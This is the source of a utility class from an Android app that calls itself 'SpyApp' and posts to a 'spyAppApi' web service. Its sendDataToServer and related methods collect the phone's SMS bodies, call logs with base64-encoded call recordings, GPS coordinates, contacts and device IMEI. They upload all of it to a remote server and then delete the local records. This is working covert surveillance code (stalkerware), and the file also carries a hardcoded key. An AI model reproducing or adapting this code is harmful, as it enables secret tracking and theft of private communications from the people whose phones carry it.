package com.blinkawards.utility;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.io.FileUtils;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.ActionBar.LayoutParams;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.Display;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.PopupWindow;
import android.widget.TextView;
import android.widget.Toast;

import com.asynctask.httpconnect.ConnectToServer;
import com.enuke.smartapp.DBHelper;
import com.enuke.smartapp.R;
import com.enuke.smartapp.call.CallLogBean;
import com.enuke.smartapp.call.CallLogProvider;
import com.enuke.smartapp.contacts.ContactsDetailsGet;
import com.enuke.smartapp.gps.GPSBean;
import com.enuke.smartapp.gps.GPSLogProvider;
import com.enuke.smartapp.sms.SmsLogBean;
import com.enuke.smartapp.sms.SmsLogProvider;

public class Utility {

	private static final String baseImageUrl = "http://198.61.191.85//blinkawards/";
	private static final String baseBarcodeImageUrl = "http://198.61.191.85//blinkawards1";
//	private static final String basePostUrl = "http://www.spynguard.com/spyAppApi/webservice/";
//	private static final String basePostUrl = "http://test.spynguard.com/spyAppApi/webservice/";
	private static final String basePostUrl = "http://www.spynguard.com/spyAppApi1.1/webservice/";
	//private static final String basePostUrl = "http://desiregroup.org/spy/webservice/";
	private static final String defaultKey = "c63e874e-be93-4fd1-b432-402db2747caa";
	public static final boolean updatenotification = true;
	private static final long maxAddTimeDifference = 1000*60*60;
	private static final long minAddTimeDifference = 1000*60*10;
	public  static String yyyy_MM_DD_HH_mm_ss="yyyy-MM-dd HH:mm:ss";

	// Utiliy method to download image from the internet (std. code)
	public static Bitmap downloadBitmap(String url) throws IOException {
		if (!url.startsWith("http://")) {
			url = "http://" + url;
		}

		HttpUriRequest request = new HttpGet(url.toString());
		DefaultHttpClient httpClient = new DefaultHttpClient();
		HttpConnectionParams.setSoTimeout(httpClient.getParams(), 2 * 60 * 1000);
		HttpConnectionParams.setConnectionTimeout(httpClient.getParams(),2 * 60 * 1000);
		HttpResponse response = httpClient.execute(request);
		StatusLine statusLine = response.getStatusLine();
		int statusCode = statusLine.getStatusCode();
		if (statusCode == 200)
		{
			HttpEntity entity = response.getEntity();
			byte[] bytes = EntityUtils.toByteArray(entity);
			
			Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0,	bytes.length);
			System.gc();
			return bitmap;
		}
		else 
		{
			throw new IOException("Download failed, HTTP response code "
					+ statusCode + " - " + statusLine.getReasonPhrase());
		}
	}

	public static void saveImgToFile(String img_name, Bitmap rcvdImg,
			Context mContext, float MAX_WIDTH, float MAX_HEIGHT) {
		byte[] ba = null;
		try {

			File audioRoot = mContext.getDir("Image", Context.MODE_PRIVATE);
			File file = new File(audioRoot, img_name);

			float scaleFactor;
			int w = rcvdImg.getWidth();
			int h = rcvdImg.getHeight();
			if (w > h)
				scaleFactor = ((float) MAX_WIDTH) / w;
			else
				scaleFactor = ((float) MAX_HEIGHT) / h;

			// create matrix for the manipulation
			Matrix matrix = new Matrix();
			// resize the bit map
			matrix.postScale(scaleFactor, scaleFactor);

			// recreate the new Bitmap
			Bitmap m_bmpImage = Bitmap.createBitmap(rcvdImg, 0, 0, w, h,
					matrix, true);

			FileOutputStream fs = new FileOutputStream(file);
			ByteArrayOutputStream bao = new ByteArrayOutputStream();
			m_bmpImage.compress(Bitmap.CompressFormat.JPEG, 75, bao);
			ba = bao.toByteArray();
			fs.write(ba);
			fs.flush();
			fs.close();
			Log.e("Utility", "Image Saved to file" + img_name);

		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	public static Drawable getImgFromFile(String img_name, Context mContext) {
		Bitmap img = null;
		try {
			File audioRoot = mContext.getDir("Image", Context.MODE_PRIVATE);
			File file = new File(audioRoot, img_name);

			FileInputStream fis = new FileInputStream(file);
			img = BitmapFactory.decodeStream(fis);
			fis.close();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}

		// Drawable d = Drawable.createFromStream(i, "src");
		Drawable d = (Drawable) new BitmapDrawable(img);
		return d;

	}

	public static boolean isFfile(String img_name, Context mContext) {
		boolean ruturn = false;
		File audioRoot = mContext.getDir("Image", Context.MODE_PRIVATE);
		File file = new File(audioRoot, img_name);

		if (file.exists()) {
			ruturn = true;
		}

		return ruturn;

	}

	public static String getBaseimageurl() {
		return baseImageUrl;
	}

	public static String getBaseposturl() {
		return basePostUrl;
	}

	public static byte[] getConvertImageToByte(Bitmap bmp) {
		byte ba[] = null;

		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		bmp.compress(Bitmap.CompressFormat.JPEG, 60, baos);
		ba = baos.toByteArray();
		return ba;

	}

	public static String getBasebarcodeimageurl() {
		return baseBarcodeImageUrl;
	}

	@SuppressLint("SimpleDateFormat")
	public static String getCTime() {

		Date date = new Date();
		SimpleDateFormat sdf;

		sdf = new SimpleDateFormat("dd MMM");

		return sdf.format(date);

	}

	public static String getDefaultkey() {
		return defaultKey;
	}

	public static boolean isInternetConnected(Context mContext) {
		ConnectivityManager connec = (ConnectivityManager) mContext
				.getSystemService(Context.CONNECTIVITY_SERVICE);

		if (connec != null
				&& (connec.getNetworkInfo(1).getState() == NetworkInfo.State.CONNECTED)
				|| (connec.getNetworkInfo(0).getState() == NetworkInfo.State.CONNECTED)) {
			return true;
		}
		return false;

	}

	public static void showToast(Context mContext, String string) {

		Toast.makeText(mContext, string, Toast.LENGTH_LONG).show();

	}

	public static void saveDataLocally(Context mContext, String key, String data) {
		final String PREFS_NAME = "SpyApp";
		SharedPreferences SpyAppData = mContext.getSharedPreferences(
				PREFS_NAME, 0);
		SharedPreferences.Editor editor = SpyAppData.edit();
		editor.putString(key, data);
		editor.commit();
	}

	public static String getSaveDataLocally(Context mContext, String key) {
		final String PREFS_NAME = "SpyApp";
		SharedPreferences SpyAppData = mContext.getSharedPreferences(
				PREFS_NAME, 0);
		String preData = SpyAppData.getString(key, "").trim();
		return preData;

	}

	public static String setCallRecordFileNam(Context mContext) {
		final String PREFS_NAME = "SpyApp";
		SharedPreferences SpyAppData = mContext.getSharedPreferences(
				PREFS_NAME, 0);
		String preData = SpyAppData.getString("mCallLogData", "").trim();
		return "dddddddddddddd";

	}
	//This code is used to rename recorded file 
	
	

	@SuppressLint("SimpleDateFormat")
	public static String DateToString(Date time) {

		SimpleDateFormat sdf = new SimpleDateFormat("MMM dd,yyyy HH:mm");

		
		return sdf.format(time);
	}
	public static String MillisecondToDate(String time) {

		SimpleDateFormat sdf = new SimpleDateFormat("MMM dd,yyyy HH:mm");

		Date resultdate = new Date(Long.parseLong(time));
		return sdf.format(resultdate);
	}
	public static String MillisecondToDateFormate(String time) {

		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");

		Date resultdate = new Date(Long.parseLong(time));
		return sdf.format(resultdate);
	}
	public static String changeDateFormate(Date date,String formate) {
		SimpleDateFormat sdf = new SimpleDateFormat(formate);
		//SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
		return sdf.format(date);
	}

	public static String getDurationString(String duration) {
		int seconds = Integer.parseInt(duration);
		int hours = seconds / 3600;
		int minutes = (seconds % 3600) / 60;
		seconds = seconds % 60;

		return twoDigitString(hours) + ":" + twoDigitString(minutes) + ":"
				+ twoDigitString(seconds);
	}

	private static String twoDigitString(int number) {

		if (number == 0) {
			return "00";
		}

		if (number % 10 == 0) {
			return "0" + number;
		}

		return String.valueOf(number);
	}

	public static File getDataDir(Context context) throws Exception {
		File audioRoot = context.getDir("Image", Context.MODE_PRIVATE);
		return audioRoot;
	}

	public static void showPopup(final Context mContext, final String msg,
			final String title,boolean size) {
		LayoutInflater inflater = (LayoutInflater) mContext
				.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
		final View view = inflater.inflate(R.layout.custom_dialog_theme, null);
		((TextView)view.findViewById(R.id.mHeaderText)).setText(title);
		final PopupWindow popupWindow;
		if (size) {
			popupWindow = new PopupWindow(view, LayoutParams.MATCH_PARENT,
					LayoutParams.MATCH_PARENT, true);
		} else {
			final Display display = ((Activity) mContext).getWindowManager()
					.getDefaultDisplay();

			popupWindow = new PopupWindow(view,
					(int) (display.getWidth() * .8),
					(int) (display.getHeight() * .5), true);
		}

		((TextView) view.findViewById(R.id.msg_text)).setText(msg);

		Button b = (Button) view.findViewById(R.id.ok_btn);
		b.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {

				popupWindow.dismiss();
			}
		});

		popupWindow.showAtLocation(view, Gravity.CENTER, 0, 0);
	}

	public static void sendDataToServer(final Context mContext) {
		
		if(isInternetConnected(mContext) && getSaveDataLocally(mContext, "isTrack").equalsIgnoreCase("true")){
			
	

		try {

			String theDevId = Utility.getDeviceKey(mContext);
			String url = Utility.getBaseposturl();
			JSONArray SmsDetails = new JSONArray();
			JSONObject smsdetails = null;
			List<SmsLogBean> data1 = SmsLogProvider.getData(mContext);
			if (data1.size() != 0) {
				for (int i = 0; i < data1.size(); i++) {
					smsdetails = new JSONObject();
					smsdetails.put("SmsAddress", data1.get(i).getmPhone());
					smsdetails.put("SmsBody", data1.get(i).getmSmsBody());
					smsdetails.put("SmsType", data1.get(i).getmType());
					smsdetails.put("DateTime", data1.get(i).getmDate());					
					SmsDetails.put(smsdetails);
					smsdetails = null;
				}

				JSONObject finaldata = new JSONObject();

				JSONObject Detils = new JSONObject();
				Detils.put("SmsDetails", SmsDetails);
				Detils.put("DeviceId", theDevId);
				Detils.put("ClientId", Utility.getClientId(mContext));
				finaldata.put("SmsData", Detils);
				

				ConnectToServer connect = new ConnectToServer();
				connect.extConnectToServera(new ConnectToServer.Callback() {
					public void callFinished(String result) {
						DBHelper dbHelper = DBHelper.getInstance(mContext);
						SQLiteDatabase db = dbHelper.getWritableDatabase();
						int status = db.delete("SmsLog", null, null);
						////System.out.println("deleted status is:" + status);
						db.close();
						// deleteAllCallLog(result);
					}

				}, url, finaldata, "POST");
				connect.execute(finaldata);

			}

		} catch (Exception e) {

			////System.out.println("Print execute error " + e);
		}
		sendCallLogDataToServer(mContext);
		sendGPSLogDataToServer(mContext);
		sendContactsDetails(mContext);

		}else{
			//showToast(mContext, "Internet is not connected");
		}
		// Toast.makeText(SendSaveDataService.this,"trying to send data over server",2).show();
		////System.out.println("trying to send data over server");

		
	}

	private static void sendContactsDetails(final Context mContext) {
		
////System.out.println("Comming for getting the contacts details");
		try {
			// //////System.out.println("time"+ts);
			String theDevId =Utility.getDeviceKey(mContext);

			String url = Utility.getBaseposturl();
			JSONArray ContactsDetail = new JSONArray();
			JSONObject ContactsDetails = null;
			

			List<Map<String,String>> data = ContactsDetailsGet.contactInfo(mContext);
			////System.out.println("Data size is:"+data.size());
			if (data.size() != 0) {
				for (int i = 0; i < data.size(); i++) {
					ContactsDetails = new JSONObject();
					ContactsDetails.put("ContactName", data.get(i).get("ContactName"));
					ContactsDetails.put("ContactNumber", data.get(i).get("PhoneNumber"));
					ContactsDetails.put("ContactEmail", data.get(i).get("Email"));
					ContactsDetail.put(ContactsDetails);
					ContactsDetails = null;

					Log.e("TAG In DB", "name= "+data.get(i).get("ContactName")+" number = "+data.get(i).get("PhoneNumber")+"Email= "+data.get(i).get("Email"));
				}

				JSONObject finaldata = new JSONObject();
				JSONObject Detils = new JSONObject();
				Detils.put("ContactsDetails", ContactsDetail);
				Detils.put("DeviceId", theDevId);
				Detils.put("ClientId", Utility.getClientId(mContext));
				finaldata.put("ContactsDetailsLog", Detils);
				ConnectToServer connect = new ConnectToServer();
				connect.extConnectToServera(new ConnectToServer.Callback() {
					public void callFinished(String result) {

						

					}

				}, url, finaldata, "POST");
				connect.execute(finaldata);
			
			}
		} catch (Exception e) {

			////System.out.println("Print execute error " + e);
		}
	}

	protected static void sendCallLogDataToServer(final Context mContext) {

		try {
			// //////System.out.println("time"+ts);
			String theDevId =Utility.getDeviceKey(mContext);

			String url = Utility.getBaseposturl();
			JSONArray CallDetails = new JSONArray();
			JSONObject Calldetails = null;

			List<CallLogBean> data = CallLogProvider.getData(mContext);
			if (data.size() != 0) {
				for (int i = 0; i < data.size(); i++) {
					Calldetails = new JSONObject();
					Calldetails.put("CallNumber", data.get(i).getmPhone());
					Calldetails.put("CallType", data.get(i).getmType());
					Calldetails.put("CallTime", Utility.MillisecondToDateFormate(data.get(i).getmDate()));
					Calldetails.put("CallDuration", data.get(i).getmDuration());
				
					Calldetails.put("CallRecordFile", getBase64EncodedString(mContext,data.get(i).getmDate()));
					Log.e("TAG", "file name when uploading = "+data.get(i).getmDate());
					CallDetails.put(Calldetails);
					Calldetails = null;

				}

				JSONObject finaldata = new JSONObject();
				JSONObject Detils = new JSONObject();
				Detils.put("CallLogDetails", CallDetails);
				Detils.put("DeviceId", theDevId);
				Detils.put("ClientId", Utility.getClientId(mContext));
				finaldata.put("CallLog", Detils);
				ConnectToServer connect = new ConnectToServer();
				connect.extConnectToServera(new ConnectToServer.Callback() {
					public void callFinished(String result) {
                        Log.i("inside CallFinish of sendCallLogDataToServer()", result);  
                        JSONObject jObj;
                        JSONObject jObjnew;
                        String statusOK = null;
                     
                        try {
                        	jObj=new JSONObject(result);
							 jObjnew = jObj.getJSONObject("CallLogResponse");						
							 statusOK=jObjnew.getString("Status");
						} catch (JSONException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
                       Log.e("response ", "status"+statusOK);
                       
                       if(statusOK.equalsIgnoreCase("ok")){
                    	//   deleteFileFromCache(mContext);
                       }
                        
						DBHelper dbHelper = DBHelper.getInstance(mContext);
						SQLiteDatabase db = dbHelper.getWritableDatabase();
						int status = db.delete("RecordingLog", null, null);
						////System.out.println("deleted status is:" + status);
						 db.close();
						//db.releaseReference();
						// deleteAllCallLog(result);

					}

				}, url, finaldata, "POST");
				connect.execute(finaldata);
			
			}
		} catch (Exception e) {

			////System.out.println("Print execute error " + e);
		}
	
	}
	//here is the code to send GpsData to server
	
	protected static void sendGPSLogDataToServer(final Context mContext) {

		try {
			
			// //////System.out.println("time"+ts);
			String theDevId =Utility.getDeviceKey(mContext);

			String url = Utility.getBaseposturl();
			JSONArray GpsLogDetailsData = new JSONArray();
			JSONObject GpsLogDetails = null;

			List<GPSBean> data = GPSLogProvider.getData(mContext);
			if (data.size() != 0) {
				for (int i = 0; i < data.size(); i++) {
					GpsLogDetails = new JSONObject();
					GpsLogDetails.put("Latitude", data.get(i).getlat());
					GpsLogDetails.put("Longitude", data.get(i).getLon());
					GpsLogDetails.put("Time", data.get(i).getdate());
					GpsLogDetails.put("Direction", data.get(i).getdir());
					GpsLogDetailsData.put(GpsLogDetails);
					GpsLogDetails = null;
					Log.e("Tag", "values getting in sendGPSLogDataToServer Lat ="+data.get(i).getlat()+"lon= "+ data.get(i).getLon());

				}

				JSONObject finaldata = new JSONObject();

				JSONObject Detils = new JSONObject();
				Detils.put("GpsLogDetailsData", GpsLogDetailsData);
				Detils.put("DeviceId", theDevId);
				Detils.put("ClientId", Utility.getClientId(mContext));
				finaldata.put("GeoLocation", Detils);
				
			

				ConnectToServer connect = new ConnectToServer();
				connect.extConnectToServera(new ConnectToServer.Callback() {
					public void callFinished(String result) {

						DBHelper dbHelper = DBHelper.getInstance(mContext);
						SQLiteDatabase db = dbHelper.getWritableDatabase();
						int status = db.delete("geolocation", null, null);
						//////System.out.println("deleted status is:" + status);
						 db.close();
						//db.releaseReference();
						// deleteAllCallLog(result);

					}

				}, url, finaldata, "POST");
				connect.execute(finaldata);
			}
		} catch (Exception e) {

			////System.out.println("Print execute error " + e);
		}

	}
	
	//end 

public static String getDeviceKey(Context mContext){
	String theDevId;
	
	if(Utility.getSaveDataLocally(mContext,"deviceid").length()>0){
		theDevId=Utility.getSaveDataLocally(mContext,"deviceid");
		
	}else{
		
		theDevId =((TelephonyManager)mContext.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();	
	}
	return theDevId;
	
	 
}
public static String getClientId(Context mContext){
	
	return getSaveDataLocally(mContext, "mClientId");
	
}

public static void setHideSoftKey(Context context,EditText mEdittext) {
	//this will help to hide the application 
	InputMethodManager imm = (InputMethodManager)context.getSystemService(
		      Context.INPUT_METHOD_SERVICE);
		imm.hideSoftInputFromWindow(mEdittext.getWindowToken(), 0);
		//end
	
}

public static boolean getAdaTimeDifference(Context applicationContext, boolean b) {
	long adtimeFlag;
	if(Utility.getSaveDataLocally(applicationContext, "showAdDate").equalsIgnoreCase(""))
	{	Utility.saveDataLocally(applicationContext, "showAdDate", String.valueOf(Calendar.getInstance().getTimeInMillis()) );
		 adtimeFlag=1;
		}
	else{
		adtimeFlag=Long.parseLong(Utility.getSaveDataLocally(applicationContext, "showAdDate"));
	}
	long flgTime;
	if(b){
		flgTime=Utility.maxAddTimeDifference;
	}else{
		flgTime=Utility.minAddTimeDifference;
	}
	if(((long)Calendar.getInstance().getTimeInMillis()-adtimeFlag)>flgTime){
		Utility.saveDataLocally(applicationContext, "showAdDate", String.valueOf(Calendar.getInstance().getTimeInMillis()) );
		return true;
	}
	return false;
	
	
}
public static String getAdatype(Context applicationContext) {
	String adtimeFlag="1";
	if(Utility.getSaveDataLocally(applicationContext, "Adtype").equalsIgnoreCase(""))
	{	Utility.saveDataLocally(applicationContext, "Adtype", "1");
		 adtimeFlag="1";
		 
		}
	else{
		adtimeFlag=Utility.getSaveDataLocally(applicationContext, "Adtype");
	}
	
	return adtimeFlag;
	
	
}

public static void setAdatype(Context context, int flg) {
	
	Utility.saveDataLocally(context, "Adtype", Integer.toString(flg));
}

public static boolean getAdaTimeDifferenceBrowser(Context mContext) {
	// TODO Auto-generated method stub
	return false;
}

/**
 *  This function is used to get base64 encoded string  .3gpp file 
 *  @param mContext
 *  @param fileName
 */
 public static String getBase64EncodedString( Context mContext,String fileName){
		String encoded = null;
		try{	
		File file=new File(Utility.getDataDir(mContext),fileName);
		byte[] bytes = FileUtils.readFileToByteArray(file);
		encoded = Base64.encodeToString(bytes, 0);  
		Log.e("encoded string", encoded);		
		} catch (Exception e) {
			e.printStackTrace();
		}
	 
	return encoded;
	 
 }
 
 private static byte[] audioBytes;
 private static Integer balen;
 
 /**
  *  This function is used to get byte array from audio like .3gpp file. 
  *  @param mContext
  *  @param fileName
  */
 public static byte[] getAudioByteArray(Context mContext,String fileName) {
		try {

			ByteArrayOutputStream bao = new ByteArrayOutputStream();
			FileInputStream in = new FileInputStream(
					new File(Utility.getDataDir(mContext),fileName));//path
			BufferedReader buf = new BufferedReader(new InputStreamReader(in));
			byte[] buffer = new byte[1024];
			int n;
			while (-1 != (n = in.read(buffer)))
				bao.write(buffer, 0, n);
			audioBytes = bao.toByteArray();

			balen = new Integer(audioBytes.length);
			Log.e("tag audio convert", String.valueOf(balen));

		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return audioBytes;
	}
 /**
  * This function is used to delete file from storage after sending recorded .3gpp data to server
  * @param mContext
  */
	public static void deleteFileFromCache(Context mContext) {
		File rootfile = null;
		
		try {
			 rootfile=getDataDir(mContext);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		if(rootfile!=null){
			 File[] files = rootfile.listFiles();
	            for(int i=0; i<files.length; i++) {
	                    files[i].delete();
	            }
		}
	}
	
	/**
	 * method is used for checking valid email id format.
	 * 
	 * @param email
	 * @return boolean true for valid false for invalid
	 */
	public static boolean isEmailValid(String email) {
	    boolean isValid = false;

	    String expression = "^[\\w\\.-]+@([\\w\\-]+\\.)+[A-Z]{2,4}$";
	    CharSequence inputStr = email;

	    Pattern pattern = Pattern.compile(expression, Pattern.CASE_INSENSITIVE);
	    Matcher matcher = pattern.matcher(inputStr);
	    if (matcher.matches()) {
	        isValid = true;
	    }
	    return isValid;
	}
	
	public static void hideSoftKeyboard(Activity activity,View view) {
		//	Log.e("hi", "view"+view);
			  if(!(view instanceof EditText))
			  {				
	    InputMethodManager inputMethodManager = (InputMethodManager)  activity.getSystemService(Activity.INPUT_METHOD_SERVICE);
	    inputMethodManager.hideSoftInputFromWindow(activity.getCurrentFocus().getWindowToken(), 0);
			  }
	}
 
}
